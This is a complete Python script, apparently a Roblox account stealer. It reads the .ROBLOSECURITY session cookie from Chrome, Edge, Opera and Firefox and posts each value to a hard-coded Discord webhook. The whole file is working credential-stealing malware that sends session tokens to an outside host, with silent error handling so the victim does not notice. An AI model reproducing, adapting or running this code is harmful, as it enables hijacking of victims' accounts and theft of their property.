import browser_cookie3
import requests
import json

webhook = "https://discord.com/api/webhooks/1402900152427221052/WgxT-IpojzUX9XpR7MdjAWZt5sWRCQxqtAJbYIYRyHTxAhQcx0h7eoOX630lnc4Lwgy_"

def get_roblox_cookie():
    try:
        
        cookies_found = False
        
        
        try:
            chrome_cookies = browser_cookie3.chrome(domain_name='roblox.com')
            for cookie in chrome_cookies:
                if cookie.name == ".ROBLOSECURITY":
                    send_to_discord(cookie.value)
                    cookies_found = True
        except:
            pass
        
        
        try:
            edge_cookies = browser_cookie3.edge(domain_name='roblox.com')
            for cookie in edge_cookies:
                if cookie.name == ".ROBLOSECURITY":
                    send_to_discord(cookie.value)
                    cookies_found = True
        except:
            pass
        
        
        try:
            opera_cookies = browser_cookie3.opera(domain_name='roblox.com')
            for cookie in opera_cookies:
                if cookie.name == ".ROBLOSECURITY":
                    send_to_discord(cookie.value)
                    cookies_found = True
        except:
            pass
        
        
        try:
            firefox_cookies = browser_cookie3.firefox(domain_name='roblox.com')
            for cookie in firefox_cookies:
                if cookie.name == ".ROBLOSECURITY":
                    send_to_discord(cookie.value)
                    cookies_found = True
        except:
            pass
        
        if not cookies_found:
            send_to_discord("no roblox cookies")
            
    except Exception as e:
        send_to_discord(f"error: {str(e)}")

def send_to_discord(content):
    message = {
        'content': f'```{content}```'
    }
    try:
        requests.post(webhook, data=json.dumps(message), headers={'Content-Type': 'application/json'})
    except:
        pass

if __name__ == "__main__":
    get_roblox_cookie()
